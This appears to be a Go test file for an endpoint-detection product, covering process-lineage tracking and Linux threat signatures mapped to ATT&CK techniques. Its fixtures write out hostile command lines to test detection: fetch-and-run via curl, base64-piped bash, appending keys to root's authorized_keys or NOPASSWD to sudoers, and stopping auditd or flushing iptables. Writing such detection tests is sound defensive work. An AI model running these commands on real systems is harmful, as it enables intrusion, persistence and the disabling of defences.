package api

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"obsidianwatch/management/internal/store"
)

func lip(n int) *int { return &n }

type linEv struct {
	pid, ppid      int
	name, exe, cmd string
	guid, pguid    string
	raw            map[string]any
	typ            string
	dst            string
}

func mk(e linEv) store.Event {
	raw := map[string]any{"action": "exec", "exe": e.exe}
	for k, v := range e.raw {
		raw[k] = v
	}
	b, _ := json.Marshal(raw)
	typ := e.typ
	if typ == "" {
		typ = "process"
	}
	ev := store.Event{
		EventType: typ, OS: "linux", AgentID: "ag-1", Host: "web01", Time: time.Now(),
		PID: lip(e.pid), PPID: lip(e.ppid), ProcessName: sp(e.name), ImagePath: sp(e.exe), CommandLine: sp(e.cmd),
		ProcessGUID: e.guid, ParentProcessGUID: e.pguid, Raw: b,
	}
	if e.dst != "" {
		ev.DstIP = sp(e.dst)
	}
	return ev
}

type fakeFetcher struct {
	events []store.Event
	calls  int
}

func (f *fakeFetcher) EventsByProcessGUIDs(_ context.Context, agent string, guids []string, _, _ time.Time, _ int) ([]store.Event, error) {
	f.calls++
	want := map[string]bool{}
	for _, g := range guids {
		want[g] = true
	}
	var out []store.Event
	for _, ev := range f.events {
		if ev.AgentID == agent && want[ev.ProcessGUID] {
			out = append(out, ev)
		}
	}
	return out, nil
}

func TestLineageWithinBatchAndChain(t *testing.T) {
	l := newLineage()
	batch := []store.Event{
		mk(linEv{pid: 1, name: "systemd", exe: "/usr/lib/systemd/systemd", guid: "g1"}),
		mk(linEv{pid: 10, ppid: 1, name: "nginx", exe: "/usr/sbin/nginx", guid: "g10", pguid: "g1"}),
		mk(linEv{pid: 20, ppid: 10, name: "sh", exe: "/bin/sh", cmd: "sh -c id", guid: "g20", pguid: "g10"}),
		mk(linEv{pid: 30, ppid: 20, name: "id", exe: "/usr/bin/id", guid: "g30", pguid: "g20"}),
	}
	l.observe(context.Background(), nil, batch)
	if got := processChain(batch[3]); got != "systemd → nginx → sh → id" {
		t.Fatalf("chain = %q", got)
	}
	if !ancestorIn(batch[2], 2, "nginx") || ancestorIn(batch[3], 1, "nginx") {
		t.Fatalf("ancestorIn wrong: %v", ancestorNames(batch[3]))
	}
}

// bash -c "cmd" execs cmd in place: same pid, start time and GUID. The
// earlier image must stay an ancestor of the later one.
func TestLineageExecInPlace(t *testing.T) {
	l := newLineage()
	t0 := time.Now()
	evs := []store.Event{
		mk(linEv{pid: 10, ppid: 1, name: "nginx", exe: "/usr/sbin/nginx", cmd: "nginx -c x", guid: "g10", pguid: "g1"}),
		mk(linEv{pid: 10, ppid: 1, name: "sh", exe: "/bin/sh", cmd: "sh -c id", guid: "g10", pguid: "g1"}),
		mk(linEv{pid: 11, ppid: 10, name: "id", exe: "/usr/bin/id", cmd: "id", guid: "g11", pguid: "g10"}),
	}
	for i := range evs {
		evs[i].Time = t0.Add(time.Duration(i) * time.Millisecond)
	}
	l.observe(context.Background(), nil, evs)
	if !parentIn(evs[1], "nginx") {
		t.Fatalf("sh lost its earlier image: %v", ancestorNames(evs[1]))
	}
	if got := processChain(evs[2]); got != "nginx → sh → id" {
		t.Fatalf("chain = %q", got)
	}
	if len(evs[0].Ancestors) != 0 {
		t.Fatalf("nginx has no known ancestors, got %v", ancestorNames(evs[0]))
	}
	if !sigByID("L-T1505.003").Match(evs[1]) {
		t.Fatal("web-shell rule must fire for nginx exec'ing sh in place")
	}
}

func TestLineageFetchesUnknownParentsFromStore(t *testing.T) {
	stored := []store.Event{
		mk(linEv{pid: 10, ppid: 1, name: "php-fpm8.2", exe: "/usr/sbin/php-fpm8.2", guid: "g10", pguid: "g1"}),
		mk(linEv{pid: 1, name: "systemd", exe: "/usr/lib/systemd/systemd", guid: "g1"}),
	}
	f := &fakeFetcher{events: stored}
	l := newLineage()
	batch := []store.Event{mk(linEv{pid: 20, ppid: 10, name: "bash", exe: "/bin/bash", cmd: "bash -i", guid: "g20", pguid: "g10"})}
	l.observe(context.Background(), f, batch)
	if got := processChain(batch[0]); got != "systemd → php-fpm8.2 → bash" {
		t.Fatalf("chain = %q (fetch calls %d)", got, f.calls)
	}
	// A parent that is nowhere is not asked for again within the hour.
	f2 := &fakeFetcher{}
	orphan := []store.Event{mk(linEv{pid: 5, ppid: 4, name: "x", exe: "/x", guid: "g5", pguid: "gone"})}
	l.observe(context.Background(), f2, orphan)
	l.observe(context.Background(), f2, []store.Event{mk(linEv{pid: 6, ppid: 4, name: "y", exe: "/y", guid: "g6", pguid: "gone"})})
	if f2.calls != 1 {
		t.Fatalf("missing parent fetched %d times", f2.calls)
	}
}

func TestLineagePIDFallbackAndHints(t *testing.T) {
	l := newLineage()
	// Windows 4688-style: no GUIDs, parent known by pid.
	parent := mk(linEv{pid: 100, name: "w3wp.exe", exe: `C:\Windows\System32\inetsrv\w3wp.exe`})
	parent.Time = time.Now().Add(-time.Minute)
	child := mk(linEv{pid: 200, ppid: 100, name: "cmd.exe", exe: `C:\Windows\System32\cmd.exe`})
	l.observe(context.Background(), nil, []store.Event{parent, child})
	evs := []store.Event{parent, child}
	l.observe(context.Background(), nil, evs)
	if !parentIn(evs[1], "w3wp") {
		t.Fatalf("pid fallback: %v", ancestorNames(evs[1]))
	}
	// Linux agent parent hints build the parent even without its own event.
	hinted := mk(linEv{pid: 7, ppid: 6, name: "sh", exe: "/bin/sh", guid: "g7", pguid: "g6",
		raw: map[string]any{"parent_exe": "/usr/sbin/nginx", "parent_name": "nginx"}})
	evs = []store.Event{hinted}
	l.observe(context.Background(), nil, evs)
	if !parentIn(evs[0], "nginx") {
		t.Fatalf("hints: %v", ancestorNames(evs[0]))
	}
}

func TestLineageNetworkEventUsesActorProcess(t *testing.T) {
	l := newLineage()
	evs := []store.Event{
		mk(linEv{pid: 10, name: "nginx", exe: "/usr/sbin/nginx", guid: "g10"}),
		mk(linEv{pid: 20, ppid: 10, name: "bash", exe: "/bin/bash", guid: "g20", pguid: "g10"}),
		mk(linEv{pid: 20, name: "bash", guid: "g20", typ: "network", dst: "203.0.113.9", raw: map[string]any{"action": "connect"}}),
	}
	l.observe(context.Background(), nil, evs)
	if !parentIn(evs[2], "nginx") {
		t.Fatalf("network actor lineage: %v", ancestorNames(evs[2]))
	}
}

func sigByID(id string) ThreatSig {
	for _, s := range linuxLineageSignatures {
		if s.ID == id {
			return s
		}
	}
	panic("no sig " + id)
}

func withParents(ev store.Event, parents ...store.ProcAncestor) store.Event {
	ev.Ancestors = parents
	return ev
}

func TestLinuxLineageRules(t *testing.T) {
	nginx := store.ProcAncestor{Name: "nginx", Image: "/usr/sbin/nginx"}
	php := store.ProcAncestor{Name: "php-fpm8.2", Image: "/usr/sbin/php-fpm8.2"}
	sshd := store.ProcAncestor{Name: "sshd", Image: "/usr/sbin/sshd"}
	redis := store.ProcAncestor{Name: "redis-server", Image: "/usr/bin/redis-server"}
	curlParent := store.ProcAncestor{Name: "sh", Image: "/bin/sh", CommandLine: "sh -c curl -s http://x/a -o /tmp/a; chmod +x /tmp/a; /tmp/a"}
	sh := mk(linEv{pid: 2, name: "sh", exe: "/bin/sh", cmd: "sh -c id"})

	cases := []struct {
		id   string
		ev   store.Event
		want bool
	}{
		{"L-T1505.003", withParents(sh, php, nginx), true},
		{"L-T1505.003", withParents(sh, nginx), true},
		{"L-T1505.003", withParents(sh, sshd), false},
		{"L-T1190.db", withParents(sh, redis), true},
		{"L-T1190.db", withParents(sh, sshd), false},
		{"L-T1105.exec", withParents(mk(linEv{name: "a", exe: "/tmp/a"}), curlParent), true},
		{"L-T1105.exec", withParents(mk(linEv{name: "a", exe: "/tmp/a"}), sshd), false},
		{"L-T1105.exec", withParents(mk(linEv{name: "ls", exe: "/usr/bin/ls"}), curlParent), false},
		{"L-T1059.004.net", mk(linEv{name: "bash", typ: "network", dst: "203.0.113.9", raw: map[string]any{"action": "connect"}}), true},
		{"L-T1059.004.net", mk(linEv{name: "bash", typ: "network", dst: "10.0.0.5", raw: map[string]any{"action": "connect"}}), false},
		{"L-T1059.004.net", mk(linEv{name: "curl", typ: "network", dst: "203.0.113.9", raw: map[string]any{"action": "connect"}}), false},
		{"L-T1620", mk(linEv{name: "x", exe: "/memfd:x (deleted)"}), true},
		{"L-T1620", mk(linEv{name: "3", exe: "/proc/self/fd/3"}), true},
		{"L-T1620", mk(linEv{name: "ls", exe: "/usr/bin/ls"}), false},
		{"L-T1070.004", mk(linEv{name: "x", exe: "/tmp/x (deleted)"}), true},
		{"L-T1070.004", mk(linEv{name: "x", exe: "/memfd:x (deleted)"}), false},
		{"L-T1036.004", mk(linEv{name: "kworker", exe: "/tmp/.k", raw: map[string]any{"argv": []string{"[kworker/0:2]"}}}), true},
		{"L-T1036.004", mk(linEv{name: "ls", exe: "/usr/bin/ls", raw: map[string]any{"argv": []string{"ls", "[x]"}}}), false},
		{"L-T1140", mk(linEv{name: "bash", exe: "/bin/bash", cmd: "bash -c echo aWQ= | base64 -d | bash"}), true},
		{"L-T1140", mk(linEv{name: "base64", exe: "/usr/bin/base64", cmd: "base64 -d file.b64 > out.bin"}), false},
		{"L-T1562.001", mk(linEv{name: "setenforce", exe: "/usr/sbin/setenforce", cmd: "setenforce 0"}), true},
		{"L-T1562.001", mk(linEv{name: "systemctl", exe: "/usr/bin/systemctl", cmd: "systemctl stop auditd"}), true},
		{"L-T1562.001", mk(linEv{name: "systemctl", exe: "/usr/bin/systemctl", cmd: "systemctl restart nginx"}), false},
		{"L-T1562.004", mk(linEv{name: "iptables", exe: "/usr/sbin/iptables", cmd: "iptables -F"}), true},
		{"L-T1562.004", mk(linEv{name: "iptables", exe: "/usr/sbin/iptables", cmd: "iptables -L -n"}), false},
		{"L-T1496", mk(linEv{name: "x", exe: "/tmp/x", cmd: "/tmp/x -o stratum+tcp://pool.example:3333 -u w"}), true},
		{"L-T1496", mk(linEv{name: "xmrig", exe: "/opt/xmrig"}), true},
		{"L-T1496", mk(linEv{name: "python3", exe: "/usr/bin/python3", cmd: "python3 app.py"}), false},
		{"L-T1564.001", mk(linEv{name: "x", exe: "/tmp/.cache/x"}), true},
		{"L-T1564.001", mk(linEv{name: ".x", exe: "/dev/shm/.x"}), true},
		{"L-T1564.001", mk(linEv{name: "x", exe: "/tmp/build/x"}), false},
		{"L-T1564.001", mk(linEv{name: "code", exe: "/home/u/.vscode-server/bin/code"}), false},
		{"L-T1098.004", mk(linEv{name: "bash", exe: "/bin/bash", cmd: "bash -c echo ssh-ed25519 AAA >> /root/.ssh/authorized_keys"}), true},
		{"L-T1098.004", mk(linEv{name: "ssh-copy-id", exe: "/usr/bin/ssh-copy-id", cmd: "ssh-copy-id cat authorized_keys"}), false},
		{"L-T1548.003", mk(linEv{name: "bash", exe: "/bin/bash", cmd: "bash -c echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"}), true},
		{"L-T1548.003", mk(linEv{name: "visudo", exe: "/usr/sbin/visudo", cmd: "visudo -f /etc/sudoers.d/x"}), false},
		{"L-T1055.008", mk(linEv{name: "gdb", exe: "/usr/bin/gdb", cmd: "gdb -p 812 -batch -ex gcore"}), true},
		{"L-T1055.008", mk(linEv{name: "gdb", exe: "/usr/bin/gdb", cmd: "gdb ./a.out"}), false},
		{"L-T1068.pkexec", mk(linEv{name: "pkexec", exe: "/usr/bin/pkexec", raw: map[string]any{"sensor": "ebpf"}}), true},
		{"L-T1068.pkexec", mk(linEv{name: "pkexec", exe: "/usr/bin/pkexec", raw: map[string]any{"sensor": "ebpf", "argv": []string{"pkexec", "id"}}}), false},
		{"L-T1068.pkexec", mk(linEv{name: "pkexec", exe: "/usr/bin/pkexec"}), false}, // no kernel argv: unknown
	}
	for _, c := range cases {
		if got := sigByID(c.id).Match(c.ev); got != c.want {
			t.Errorf("%s on %s %q (chain %v): got %v, want %v", c.id, deref(c.ev.ImagePath), deref(c.ev.CommandLine),
				strings.Join(ancestorNames(c.ev), ","), got, c.want)
		}
	}
}
